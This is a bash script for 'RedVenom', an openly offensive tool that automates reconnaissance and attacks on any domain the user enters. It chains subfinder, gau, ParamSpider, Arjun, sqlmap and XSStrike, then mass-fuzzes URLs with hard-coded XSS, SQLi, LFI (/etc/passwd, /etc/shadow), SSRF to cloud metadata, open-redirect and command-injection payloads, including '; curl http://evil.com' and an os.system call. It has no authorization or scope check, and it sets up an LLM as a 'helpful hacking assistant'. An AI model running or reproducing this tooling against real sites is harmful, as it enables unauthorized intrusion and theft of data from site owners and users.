#!/bin/bash

# RedVenom v2.2 — Aggressive Web Recon & Attack Automation Tool
# Created by: Abdallah Yasser

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}"
echo "██████╗ ███████╗██████╗ ██╗   ██╗███████╗███╗   ███╗ ██████╗ ███╗   ███╗"
echo "██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝████╗ ████║██╔═══██╗████╗ ████║"
echo "██████╔╝█████╗  ██████╔╝██║   ██║█████╗  ██╔████╔██║██║   ██║██╔████╔██║"
echo "██╔═══╝ ██╔══╝  ██╔═══╝ ██║   ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╔╝██║"
echo "██║     ███████╗██║     ╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚═╝ ██║"
echo "╚═╝     ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
echo -e "${NC}"
echo -e "${CYAN}🔗 Created by Abdallah Yasser | RedVenom v2.2${NC}"
echo "==================================================================="

MAX_JOBS=50

manage_jobs() {
    while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
        sleep 0.5
    done
}
# === TOOL AUTO-DETECTOR (RedVenom v3) ===

SUBFINDER_CMD=$(command -v subfinder 2>/dev/null)
[[ -z "$SUBFINDER_CMD" ]] && echo -e "${YELLOW}[!] subfinder not found. Recon will be limited.${NC}"

HTTPX_CMD=$(command -v httpx 2>/dev/null)
[[ -z "$HTTPX_CMD" ]] && echo -e "${YELLOW}[!] httpx not found. Subdomain probing skipped.${NC}"

GAU_CMD=$(command -v gau 2>/dev/null)
[[ -z "$GAU_CMD" ]] && echo -e "${YELLOW}[!] gau not found. Historical URLs skipped.${NC}"

PARAMSPIDER_CMD=$(command -v paramspider 2>/dev/null)
[[ -z "$PARAMSPIDER_CMD" ]] && echo -e "${YELLOW}[!] paramspider not found. Param discovery limited.${NC}"

ARJUN_CMD=$(command -v arjun 2>/dev/null)
[[ -z "$ARJUN_CMD" ]] && echo -e "${YELLOW}[!] arjun not found. Hidden param fuzzing skipped.${NC}"

SQLMAP_CMD=$(command -v sqlmap 2>/dev/null)
[[ -z "$SQLMAP_CMD" ]] && echo -e "${YELLOW}[!] sqlmap not found. SQLi scan disabled.${NC}"

XSSTRIKE_CMD=$(command -v xsstrike 2>/dev/null)
[[ -z "$XSSTRIKE_CMD" ]] && [[ -f "XSStrike/xsstrike.py" ]] && XSSTRIKE_CMD="python3 XSStrike/xsstrike.py"
[[ -z "$XSSTRIKE_CMD" ]] && echo -e "${YELLOW}[!] XSStrike not found. XSS scan disabled.${NC}"

NUCLEI_CMD=$(command -v nuclei 2>/dev/null)
[[ -z "$NUCLEI_CMD" ]] && echo -e "${YELLOW}[!] nuclei not found. Passive scanning skipped.${NC}"



ask_ai() {
    API_KEY=$(cat ~/.openrouter_key 2>/dev/null)
    if [[ -z "$API_KEY" ]]; then
        echo -e "${RED}[-] No OpenRouter API key found in ~/.openrouter_key${NC}"
        return
    fi

    echo -e "${CYAN}[*] Starting RedVenom AI session. Type 'exit' to quit.${NC}"

    while true; do
        read -p "[AI] ➤ " USER_QUERY
        [[ "$USER_QUERY" == "exit" ]] && echo -e "${CYAN}[*] Ending AI session.${NC}" && break
        [[ -z "$USER_QUERY" ]] && continue

        RESPONSE=$(curl -s https://openrouter.ai/api/v1/chat/completions \
            -H "Authorization: Bearer $API_KEY" \
            -H "Content-Type: application/json" \
            -d "$(jq -n \
                --arg model "mistralai/mistral-7b-instruct" \
                --arg query "$USER_QUERY" \
                '{
                    model: $model,
                    messages: [
                        { "role": "system", "content": "You are RedVenom AI, a helpful hacking assistant." },
                        { "role": "user", "content": $query }
                    ]
                }')"
        )

        MESSAGE=$(echo "$RESPONSE" | jq -r '.choices[0].message.content // empty')
        if [[ -z "$MESSAGE" ]]; then
            echo -e "${RED}[-] No response. Raw output:${NC}"
            echo "$RESPONSE" | jq
        else
            echo -e "${GREEN}[AI]:${NC} $MESSAGE"
        fi
    done
}

summarize_results() {
    echo -e "${CYAN}[*] Generating AI summary from scan results...${NC}"

    API_KEY=$(cat ~/.openrouter_key 2>/dev/null)
    [[ -z "$API_KEY" ]] && echo -e "${RED}[-] No OpenRouter API key found.${NC}" && return

    XSSTRIKE_SUMMARY=$(head -c 3000 recon_venom/xsstrike_results.txt 2>/dev/null)
    SQLMAP_SUMMARY=$(find recon_venom/sqlmap_results -name "*.csv" -exec head -c 3000 {} + 2>/dev/null)
    FUZZ_LOG=$(grep -E '\[XSS\]|\[SQLi\]|\[LFI\]|\[JSONi\]' recon_venom/fuzzing_log.txt | head -c 3000)
    NUCLEI=$(head -c 3000 confirmed/nuclei/confirmed_nuclei.txt 2>/dev/null)

    PROMPT="You are a cybersecurity expert. Summarize and prioritize the following findings from a Red Team scan:\n\n[XSStrike]:\n$XSSTRIKE_SUMMARY\n\n[SQLMap]:\n$SQLMAP_SUMMARY\n\n[Fuzzing]:\n$FUZZ_LOG\n\n[Nuclei]:\n$NUCLEI"

    RESPONSE=$(curl -s https://openrouter.ai/api/v1/chat/completions \
        -H "Authorization: Bearer $API_KEY" \
        -H "Content-Type: application/json" \
        -d @- <<EOF
{
  "model": "mistralai/mistral-7b-instruct",
  "messages": [
    { "role": "system", "content": "You are a cybersecurity expert writing a professional bug bounty scan report with severity classification and remediation suggestions." },
    { "role": "user", "content": "$PROMPT" }
  ]
}
EOF
    )

    SUMMARY=$(echo "$RESPONSE" | jq -r '.choices[0].message.content // empty')
    echo -e "\n${GREEN}[+] AI Summary Report:${NC}"
    echo "$SUMMARY"

    echo "$SUMMARY" > recon_venom/ai_report.txt
    echo -e "${CYAN}[✔] Saved to recon_venom/ai_report.txt${NC}"
}



read -p "[?] Enter the target domain (e.g. example.com): " TARGET
read -p "[?] Do you want to enable VPN? (y/n): " VPN_OPTION

# PHASE 1 — VPN (Optional)
if [[ "$VPN_OPTION" == "y" ]]; then
    if pgrep openvpn > /dev/null; then
        echo -e "${GREEN}[+] VPN is already running.${NC}"
    else
        echo -e "${CYAN}[*] Starting OpenVPN...${NC}"
        sudo openvpn --config ~/vpn-config.ovpn &
        sleep 10
        if pgrep openvpn > /dev/null; then
            echo -e "${GREEN}[+] VPN connected successfully.${NC}"
        else
            echo -e "${RED}[-] VPN failed to connect. Exiting.${NC}"
            exit 1
        fi
    fi
else
    echo -e "${CYAN}[*] VPN skipped by user.${NC}"
fi

mkdir -p recon_venom results
# PHASE 2 — Enhanced Recon (RedVenom v3)
# Detect required tools
SUBFINDER_CMD=$(command -v subfinder)
HTTPX_CMD=$(command -v httpx)
GAU_CMD=$(command -v gau)
PARAMSPIDER_CMD=$(command -v paramspider)
ARJUN_CMD=$(command -v arjun)
CURL_CMD=$(command -v curl)

echo -e "${CYAN}[+] Cleaning old recon data...${NC}"
rm -rf recon_venom/*
mkdir -p recon_venom/{js,params}

if [[ -n "$SUBFINDER_CMD" ]]; then
    echo -e "${CYAN}[*] Running Subfinder...${NC}"
    $SUBFINDER_CMD -d "$TARGET" -silent -o recon_venom/subdomains.txt & PID1=$!
else
    echo -e "${RED}[-] Subfinder not found. Skipping.${NC}"
    PID1=""
fi

if [[ -n "$GAU_CMD" ]]; then
    echo -e "${CYAN}[*] Running gau...${NC}"
    $GAU_CMD --subs --o recon_venom/gau_urls.txt "$TARGET" & PID2=$!
else
    echo -e "${RED}[-] gau not found. Skipping.${NC}"
    PID2=""
fi

[[ -n "$PID1" ]] && wait $PID1
if [[ -n "$HTTPX_CMD" ]]; then
    echo -e "${CYAN}[*] Running httpx...${NC}"
    $HTTPX_CMD -l recon_venom/subdomains.txt -silent -o recon_venom/httpx_live.txt & PID3=$!
else
    echo -e "${RED}[-] httpx not found. Skipping.${NC}"
    PID3=""
fi

[[ -n "$PID2" ]] && wait $PID2
[[ -n "$PID3" ]] && wait $PID3


echo -e "${CYAN}[*] Running ParamSpider...${NC}"
RAW_OUTPUT="recon_venom/params/paramspider_raw.txt"
CLEAN_OUTPUT="recon_venom/params/paramspider_cleaned.txt"
> "$RAW_OUTPUT"
> "$CLEAN_OUTPUT"
if [[ ! -s recon_venom/httpx_live.txt ]]; then
    echo -e "${RED}[-] No live subdomains found. Skipping ParamSpider.${NC}"
else
    echo -e "${CYAN}[*] Running ParamSpider...${NC}"

while read -r domain; do
    [[ -z "$domain" ]] && continue
    $PARAMSPIDER_CMD -d "$domain" \
        --quiet \
        --exclude woff,ttf,svg,png,jpg,jpeg,gif,css,js,ico,bmp,webp \
        2>/dev/null >> "$RAW_OUTPUT"
done < recon_venom/httpx_live.txt

grep -Eo 'https?://[^ ]+\?[^ ]+' "$RAW_OUTPUT" | sort -u > "$CLEAN_OUTPUT"
echo -e "${GREEN}[✔] ParamSpider output saved to:${NC} $CLEAN_OUTPUT"
fi

# Hidden Parameter Discovery via Arjun
echo -e "${CYAN}[*] Running Arjun for hidden parameter discovery...${NC}"
$ARJUN_CMD -i recon_venom/httpx_live.txt -oT recon_venom/params/arjun_params.txt -t 20 2>/dev/null

# JavaScript link extraction (filtered by target domain)
echo -e "${CYAN}[*] Finding JS files from gau output...${NC}"

if [[ ! -s recon_venom/gau_urls.txt ]]; then
    echo -e "${RED}[-] gau output not found. Skipping JS file extraction.${NC}"
else
    grep -Ei '\.js($|\?)' recon_venom/gau_urls.txt | grep "$TARGET" | sort -u > recon_venom/js/js_files.txt
fi

echo -e "${CYAN}[*] Extracting endpoints from JS files (filtered)...${NC}"
> recon_venom/js/endpoints.txt
while read -r jsurl; do
    $CURL_CMD -sk "$jsurl" | grep -Eo '[a-zA-Z0-9_\/.-]+?\.(php|asp|aspx|jsp|json|cgi)' >> recon_venom/js/endpoints.txt
done < recon_venom/js/js_files.txt
sort -u recon_venom/js/endpoints.txt -o recon_venom/js/endpoints.txt

# Merge Everything
echo -e "${CYAN}[*] Merging URLs for final list...${NC}"
cat recon_venom/gau_urls.txt \
    recon_venom/params/paramspider_cleaned.txt \
    recon_venom/js/endpoints.txt \
    recon_venom/params/arjun_params.txt 2>/dev/null | sort -u > recon_venom/all_urls.txt

# Optional Filtering
read -p "[?] Do you want full filtered output (only dynamic pages with params)? (y/n): " FILTER_OPTION
if [[ "$FILTER_OPTION" == "y" ]]; then
    echo -e "${CYAN}[*] Filtering for dynamic URLs only (.php, .asp, .jsp, .cgi)...${NC}"
    grep '?' recon_venom/all_urls.txt | grep -Ei '\.php|\.asp|\.aspx|\.jsp|\.cgi' \
      | grep -vE '\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf)' \
      | sort -u > recon_venom/all_cleaned_urls.txt
else
    echo -e "${CYAN}[*] Using all parameterized URLs without filtering...${NC}"
    grep '?' recon_venom/all_urls.txt | sort -u > recon_venom/all_cleaned_urls.txt
fi

echo -e "${GREEN}[✔] Recon phase complete. Output in:${NC} recon_venom/all_cleaned_urls.txt"


#sqlmap+xsstrike phase
SQLMAP_CMD=$(command -v sqlmap)

echo -e "${CYAN}[*] Running SQLMap...${NC}"
$SQLMAP_CMD -m recon_venom/all_cleaned_urls.txt --batch --random-agent --output-dir=recon_venom/sqlmap_results

echo -e "${CYAN}[*] Running XSStrike on each URL...${NC}"

MAX_XS_JOBS=10
manage_xs_jobs() {
    while [ "$(jobs -rp | wc -l)" -ge "$MAX_XS_JOBS" ]; do
        sleep 0.5
    done
}

> recon_venom/xsstrike_raw.txt
> recon_venom/xsstrike_results_clean.txt
> recon_venom/xsstrike_vulns.txt

while read -r url; do
    [[ -z "$url" ]] && continue
    manage_xs_jobs
    {
        echo -e "${CYAN}[XSStrike] Testing: $url${NC}"
        XS_OUTPUT=$($XSSTRIKE_CMD -u "$url" --skip --crawl 2>/dev/null | tee -a recon_venom/xsstrike_raw.txt)

        if echo "$XS_OUTPUT" | grep -iqE 'vulnerable|vulnerability|XSS'; then
            echo "$url [VULNERABLE]" | tee -a recon_venom/xsstrike_results_clean.txt recon_venom/xsstrike_vulns.txt
        else
            echo "$url [Not Vulnerable]" >> recon_venom/xsstrike_results_clean.txt
        fi
    } &
done < recon_venom/all_cleaned_urls.txt

wait
echo -e "${GREEN}[+] Cleaned XSStrike results saved in:${NC}"
echo -e "${CYAN}    - recon_venom/xsstrike_results_clean.txt"
echo -e "${CYAN}    - recon_venom/xsstrike_vulns.txt"
echo -e "${CYAN}    - recon_venom/xsstrike_raw.txt${NC}"

echo -e "${GREEN}[+] Scanning phase complete.${NC}"


# PHASE 4 — Fuzzing (XSS, SQLi, LFI, Redirect, SSTI, RCE, JSONi, SSRF)
echo -e "${CYAN}[*] Preparing payload files and confirmed folder...${NC}"
mkdir -p payloads recon_venom/confirmed

# Payload sets

cat > payloads/xss.txt <<'EOF'
"><svg/onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
"><iframe src=javascript:alert(1)>
"><body onload=alert(1)>
"><scr<script>ipt>alert(1)</scr</script>ipt>
"><details/open/ontoggle=alert(1)>
"><marquee/onstart=alert(1)>
EOF


cat > payloads/sqli.txt << 'EOF'
' OR 1=1 --
" OR "1"="1
admin' --
' OR sleep(5)-- 
' AND '1'='1
' or 1=1 limit 1; --
EOF

cat > payloads/lfi.txt << 'EOF'
../../../../etc/passwd
../../../../../../etc/shadow
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
../../../boot.ini
EOF

cat > payloads/open_redirect.txt << 'EOF'
http://evil.com
https://evil.com
//evil.com
//google.com%2F%2F@evil.com
/?next=http://evil.com
EOF

cat > payloads/ssrf.txt << 'EOF'
http://127.0.0.1
http://localhost
http://169.254.169.254
http://[::1]
http://0.0.0.0
EOF

cat > payloads/rce.txt << 'EOF'
;ls
| whoami
&& cat /etc/passwd
; ping -c 1 127.0.0.1
; curl http://evil.com
EOF

cat > payloads/ssti.txt << 'EOF'
{{7*7}}
{{1337*1337}}
\${7*7}
\${{7*7}}
<%= 7 * 7 %>
EOF

cat > payloads/json.txt << 'EOF'
{"username":"admin","password":"' OR '1'='1"}
{"user":"\${7*7}"}
{"input":"<script>alert(1)</script>"}
{"path":"../../../../etc/passwd"}
{"redirect":"http://evil.com"}
{"cmd":"__import__('os').system('id')"}
EOF

# Confirmed detection logic
detect_vuln() {
    local url="$1"
    local payload="$2"
    local type="$3"
    response=$($CURL_CMD -sk "$url" --max-time 10)

    case "$type" in
        "XSS")
            if echo "$response" | grep -qE '<script>alert\(1\)</script>|<svg/onload=alert\(1\)>|onerror=alert'; then
                echo -e "${GREEN}[VULNERABLE][XSS] $url${NC}" | tee -a recon_venom/confirmed/xss.txt
            fi ;;
        "SQLi")
            if echo "$response" | grep -qE 'SQL syntax|mysql_fetch|syntax error|unterminated query'; then
                echo -e "${GREEN}[VULNERABLE][SQLi] $url${NC}" | tee -a recon_venom/confirmed/sqli.txt
            fi ;;
        "LFI")
            if echo "$response" | grep -qE 'root:.*:0:0|boot.ini'; then
                echo -e "${GREEN}[VULNERABLE][LFI] $url${NC}" | tee -a recon_venom/confirmed/lfi.txt
            fi ;;
        "Redirect")
            if echo "$response" | grep -qi "Location: http://evil.com"; then
                echo -e "${GREEN}[VULNERABLE][Redirect] $url${NC}" | tee -a recon_venom/confirmed/redirect.txt
            fi ;;
        "RCE")
            if echo "$response" | grep -qE 'uid=|root|Administrator'; then
                echo -e "${GREEN}[VULNERABLE][RCE] $url${NC}" | tee -a recon_venom/confirmed/rce.txt
            fi ;;
        "SSTI")
            if echo "$response" | grep -qE '49|1787569'; then
                echo -e "${GREEN}[VULNERABLE][SSTI] $url${NC}" | tee -a recon_venom/confirmed/ssti.txt
            fi ;;
        "JSON")
            if echo "$response" | grep -qE 'alert\(1\)|root:|uid=|error'; then
                echo -e "${GREEN}[VULNERABLE][JSONi] $url -- Payload: $payload${NC}" | tee -a recon_venom/confirmed/jsoni.txt
            fi ;;
    esac
}

# Control job limit
MAX_JOBS=15
manage_jobs() {
    while [ "$(jobs -rp | wc -l)" -ge "$MAX_JOBS" ]; do
        sleep 0.3
    done
}

echo -e "${GREEN}[+] Payloads loaded. Starting Fuzzing Phase...${NC}"

mapfile -t XSS_PAYLOADS < payloads/xss.txt
mapfile -t SQLI_PAYLOADS < payloads/sqli.txt
mapfile -t LFI_PAYLOADS < payloads/lfi.txt
mapfile -t REDIRECT_PAYLOADS < payloads/open_redirect.txt
mapfile -t SSRF_PAYLOADS < payloads/ssrf.txt
mapfile -t RCE_PAYLOADS < payloads/rce.txt
mapfile -t SSTI_PAYLOADS < payloads/ssti.txt
mapfile -t JSON_PAYLOADS < payloads/json.txt

while read -r url; do
    for payload in "${XSS_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "XSS" & manage_jobs
    done

    for payload in "${SQLI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "SQLi" & manage_jobs
    done

    for payload in "${LFI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "LFI" & manage_jobs
    done

    for payload in "${REDIRECT_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "Redirect" & manage_jobs
    done

    for payload in "${SSRF_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        echo -e "[SSRF] $fuzzed" | tee -a recon_venom/fuzzing_log.txt
        $CURL_CMD -sk "$fuzzed" -o /dev/null & manage_jobs
    done

    for payload in "${RCE_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "RCE" & manage_jobs
    done

    for payload in "${SSTI_PAYLOADS[@]}"; do
        fuzzed=$(echo "$url" | sed -E "s|=[^&]*|$(printf '%s' "$payload" | sed 's/[|&/\]/\\&/g')|g")

        detect_vuln "$fuzzed" "$payload" "SSTI" & manage_jobs
    done

    for payload in "${JSON_PAYLOADS[@]}"; do
        echo -e "[JSON] $url -- POST Payload: $payload" | tee -a recon_venom/fuzzing_log.txt
        response=$($CURL_CMD -sk -X POST -H "Content-Type: application/json" -d "$payload" "$url")
        detect_vuln "$url" "$payload" "JSON"
    done

done < recon_venom/all_cleaned_urls.txt

wait
echo -e "${GREEN}[✔] Fuzzing phase complete. Confirmed results saved in: recon_venom/confirmed/${NC}"

# PHASE 5 — Passive/Active Scanning with Nuclei (Parallel)
echo -e "${CYAN}[*] Launching Nuclei scanning...${NC}"
mkdir -p recon_venom/nuclei_results confirmed/nuclei

# Run Nuclei silently and output JSON
nuclei -l recon_venom/all_cleaned_urls.txt -o recon_venom/nuclei_results/raw.txt -json -silent &

# Parse and extract confirmed vulnerabilities with severity ratings
{
    sleep 10  # Give nuclei time to create output
    echo -e "${CYAN}[*] Extracting and rating confirmed Nuclei findings...${NC}"
    if [[ -f recon_venom/nuclei_results/raw.txt ]]; then
        jq -r '.templateID + " | " + .info.name + " | " + .info.severity + " | " + .matched_at' recon_venom/nuclei_results/raw.txt \
        | tee confirmed/nuclei/confirmed_nuclei.txt > /dev/null
        echo -e "${GREEN}[+] Nuclei confirmed findings logged at confirmed/nuclei/confirmed_nuclei.txt${NC}"
    else
        echo -e "${RED}[-] Nuclei raw output not found. Skipping parsing.${NC}"
    fi
} &

# Wait for all background jobs to finish
wait

# Offer AI Assistant or Summary
echo -e "${CYAN}[✔] All scan phases complete.${NC}"

ai_menu() {
    echo -e "\n${CYAN}[!] RedVenom AI Options:${NC}"
    echo "   1) Ask the AI Assistant"
    echo "   2) Summarize Findings"
    echo "   3) Skip"

    while true; do
        read -p "[?] Choose (1/2/3): " choice
        case "$choice" in
            1) ask_ai ;;
            2) summarize_results ;;
            3) break ;;
            *) echo -e "${RED}[-] Invalid option.${NC}" ;;
        esac
    done
}

ai_menu


# PHASE 6 — Cleanup & VPN Disconnect
if [[ "$VPN_OPTION" == "y" ]]; then
    echo -e "${CYAN}[*] Disconnecting VPN...${NC}"
    sudo killall openvpn
    echo -e "${GREEN}[+] VPN disconnected.${NC}"
fi

echo -e "${GREEN}[✔] RedVenom v3 finished. Results saved in recon_venom/.${NC}"
